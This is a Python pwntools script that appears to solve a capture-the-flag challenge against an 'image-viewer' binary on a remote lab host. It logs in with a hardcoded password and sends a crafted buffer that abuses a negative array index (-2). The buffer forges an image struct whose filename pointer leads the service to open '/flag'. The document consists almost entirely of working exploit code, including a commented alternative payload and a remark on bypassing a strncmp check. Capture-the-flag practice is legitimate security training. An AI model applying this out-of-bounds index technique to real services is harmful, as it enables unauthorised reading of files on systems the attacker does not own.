from pwn import *

"""
Some sort of fixed-size byte-array class.
Allows you to write `n` bytes to a given index

size -> Size of the byte-array
fill -> Initial contents of the byte-array (default: \x00)
"""
class OverEngineerTheSolutionToTheProblem:
    def __init__(self, size, fill=b'\x00'):
        self.size = size
        self.data = [fill] * size
    def encode(self, _):
        return b"".join(self.data)
    def __str__(self):
        return str(self.encode(None))
    def __getitem__(self, idx):
        if idx >= self.size:
            raise IndexError()
        return b"".join(self.data[idx:])
    def __setitem__(self, idx, value):
        if idx + len(value) >= self.size:
            raise IndexError()
        for x in range(len(value)):
            self.data[idx + x] = bytes([value[x]])

# gcc -g -m32 -no-pie image-viewer.c -o image-viewer 

# p = process("./image-viewer")
p = remote("plsdonthaq.me", 5003)

# Log in
p.recvuntil("Password pls> ")
p.sendline("trivial")

# Static analysis reveals that the buffer and images array are immediately adjacent
buffer_addr = 0x804c060 # Size 128
images_addr = 0x804c0e0

# The image structure contains a 4-byte id, and a pointer to the file
'''
struct image {
  int id;
  char *filename;
};
'''
structData = b''
structData += p32(-2 & 0xFFFFFFFF)
structData += p32(buffer_addr + 50) # p32(buff+50)

# tag = b'./flat earth truth\x00' # Bypass the strncmp check
tag = b'/flag'

payload = OverEngineerTheSolutionToTheProblem(128)
payload[0] = b"-2"         # Choose image number -2
payload[50] = tag          # buf+50  contains the file name
payload[112] = structData  # buf+112 contains the struct image (id: -2, filename: buf+50)

# payload = b""
# payload += b"-2"         # buff+0   to  buff+2
# payload += b'\x11' * 48  # buff+2   to  buff+50
# payload += tag           # buff+50  to  buff+69
# payload += b'A' * 43     # buff+69  to  buff+112
# payload += structData    # buff+112 to  buff+120
# payload += b'AAAAAAAA'   # buff+120 to  buff+128
# #                   ^ will get stripped off by fgets       

p.sendline(payload)
p.interactive()
